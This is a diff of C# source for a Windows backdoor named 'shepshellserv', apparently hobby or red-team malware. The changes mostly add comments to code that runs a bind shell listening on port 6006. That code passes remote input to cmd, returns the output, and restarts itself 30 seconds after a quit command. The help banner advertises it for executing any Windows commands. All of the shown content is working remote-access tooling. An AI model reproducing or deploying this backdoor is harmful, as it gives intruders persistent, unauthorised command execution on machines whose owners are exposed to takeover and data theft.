@@ -25,11 +25,11 @@ namespace shepshellserv
             Backdoor backdoor = new Backdoor();
         }
 
-        public void startServer()
+        public void startServer() // starts the listener and streams
         {
             try
             {
-                int port = 6006;
+                int port = 6006; // port the bind shell listens on 
 
                 try
                 {
@@ -44,7 +44,7 @@ namespace shepshellserv
                 outStream = new StreamWriter(s);
                 outStream.AutoFlush = true;
 
-                startCMD();
+                startCMD(); // create cmd instance
                 writer = shell.StandardInput;
                 reader = shell.StandardOutput;
                 writer.AutoFlush = true;
@@ -52,8 +52,8 @@ namespace shepshellserv
                 shellThread = new Thread(new ThreadStart(getShellInput));
                 shellThread.Start();
 
-                getInput();
-                burn();
+                getInput(); // get command input to run from server
+                burn(); // 
 
             }
             catch (Exception) { burn(); }
@@ -84,7 +84,7 @@ namespace shepshellserv
                 outStream.WriteLine("\r\n");
                 while ((tempBuf = reader.ReadLine()) != null)
                 {
-                    outStream.WriteLine(tempBuf + "\r");
+                    outStream.WriteLine(tempBuf + "\r"); // contents + endline to buffer
                 }
                 burn();
             }
@@ -98,7 +98,7 @@ namespace shepshellserv
                 String tempBuff = "";
                 while (((tempBuff = inStream.ReadLine()) != null))
                 {
-                    handleCommand(tempBuff);
+                    handleCommand(tempBuff); // execute command through CMD
                 }
             }
 
@@ -110,9 +110,9 @@ namespace shepshellserv
             try
             {
 
-                if (input.Equals("quit"))
+                if (input.Equals("quit") || input.Equals("exit"))
                 {
-                    burn();
+                    burn(); // errors out the program, restarting the shell in 30 seconds
                 }
                 else if (input.Equals("help"))
                 {
@@ -124,11 +124,12 @@ namespace shepshellserv
 /\__/ / | | | | | |___  | |     | | | | | |\ \  | |/ /      /\__/ /      | |_/ /  _| |_  | |\  | | |/ / 
 \____/  \_| |_/ \____/  \_|     \_| |_/ \_| \_| |___/       \____/       \____/   \___/  \_| \_/ |___/  
                                   
-% D3ADZO % 
+% d3adzo % 
 Use this bind shell to execute any Windows commands. 
 Sending the command <help> will bring this up again.
+Sending the command <quit> will restart the shell in 30 seconds. 
 ");
-                    writer.WriteLine("EOFX\r\n");
+                    writer.WriteLine("EOFX\r\n"); // EOFX is my way of determining when output is finished
                 }
                 else
                 {
@@ -141,7 +142,7 @@ Sending the command <help> will bring this up again.
         }
 
 
-        private void burn()
+        private void burn() // shuts down shell
         {
             shell.Close();
             shell.Dispose();
